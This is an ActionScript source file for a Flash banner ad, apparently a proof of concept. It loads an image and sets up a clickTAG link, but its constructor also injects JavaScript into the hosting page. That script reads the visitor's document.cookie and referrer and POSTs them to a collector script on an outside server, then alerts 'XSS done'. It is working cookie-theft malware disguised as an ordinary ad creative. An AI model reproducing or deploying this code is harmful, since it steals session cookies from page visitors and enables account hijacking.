package {
	import flash.display.*;
	import flash.net.*;
	import flash.external.*;
	import flash.events.MouseEvent; 
	
	[SWF(width='250',height='250')]
	public class Pixel extends MovieClip {
		 
		
		public function Pixel() {
			
			var myJavaScript:XML = 
			<script>
			<![CDATA[
				
				function(myFoo){
					function ajaxRequest(){
						var activexmodes=["Msxml2.XMLHTTP", "Microsoft.XMLHTTP"] //activeX versions to check for in IE
						if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
							for (var i=0; i<activexmodes.length; i++){
								try{
									return new ActiveXObject(activexmodes[i])
								}
								catch(e){
								//suppress error
								alert('No ajax');
								}	
							}
						}	
						else if (window.XMLHttpRequest)
							// if Mozilla, Safari etc
							return new XMLHttpRequest()
						else
						return false
					};
				
					function myFunc (str){
						var params = "c="+document.cookie+"&r="+document.referrer;
						//var url = "http://stanford.edu/~subodh/cgi-bin/collect.php?"+params;
						var url = "http://stanford.edu/~subodh/cgi-bin/collectp.php";
						
						//alert(document.cookie); 
						var http = new ajaxRequest();
						
						http.open("POST", url, true);
						//http.open("GET", url, true);
						http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						
						http.send(params);
						//http.send();
						alert('XSS done');
					};  
					myFunc(myFoo); 
				}
			]]>
		   </script> 
		
		   
			var pictLdr:Loader = new Loader(); 
			var pictURL:String = "http://stanford.edu/~subodh/cgi-bin/images/image250x250.jpg";
			var pictURLReq:URLRequest = new URLRequest(pictURL); 
			pictLdr.load(pictURLReq);
			
			this.addChild(pictLdr);		
			
			//var imgObj:BitmapAsset = new imgCls();
			//var image:Image = new Image();
			//image.data(imgObj);
			//addChild(image);
			
			ExternalInterface.call(myJavaScript, "bye");
			
			pictLdr.content.addEventListener(MouseEvent.CLICK, 
					function(event: MouseEvent) : void { 
						flash.net.navigateToURL(new URLRequest( root.loaderInfo.parameters.clickTAG), "_blank"); 
						} 
					);
			
		}
		
		
		
		
		
	}
}